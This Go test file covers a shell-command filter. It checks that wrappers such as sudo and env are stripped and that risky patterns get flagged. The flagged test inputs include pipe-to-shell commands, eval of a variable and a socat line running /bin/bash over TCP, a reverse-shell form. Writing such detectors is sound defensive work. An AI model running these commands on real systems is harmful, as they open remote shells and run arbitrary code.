package filter

import "testing"

func TestExtractBinaryStripsWrappers(t *testing.T) {
	cases := map[string]string{
		"sudo python3 -c x":      "python3",
		"env VAR=1 python -c y":  "python",
		"timeout 5 perl -e z":    "perl",
		"nice -n 10 ruby s.rb":   "ruby",
		"/usr/bin/python3 a":     "python3",
		"busybox sh":             "sh",
		"sudo env timeout 3 awk": "awk",
		"ls -la":                 "ls",
	}
	for in, want := range cases {
		if got := extractBinary(in); got != want {
			t.Errorf("extractBinary(%q) = %q, want %q", in, got, want)
		}
	}
}

func TestUniversalPipeAndShellVariants(t *testing.T) {
	u := compileUniversal()
	scan := func(cmd string) bool {
		for _, r := range u {
			if r.pattern.MatchString(cmd) {
				return true
			}
		}
		return false
	}
	flagged := []string{
		`echo id |& sh`,                // pipe-and to shell
		`cat x | /bin/bash`,            // path to shell
		`foo | sudo sh`,                // sudo shell
		`echo /bin/sh | xargs sh -c`,   // xargs spawning a shell
		`socat EXEC:/bin/bash tcp:h:1`, // socat colon exec form
		`eval $CMD`,                    // eval with a variable
	}
	for _, cmd := range flagged {
		if !scan(cmd) {
			t.Errorf("universal filter should flag %q", cmd)
		}
	}
	if scan(`ls -la | grep foo`) {
		t.Error("benign `ls | grep foo` should not be flagged")
	}
}
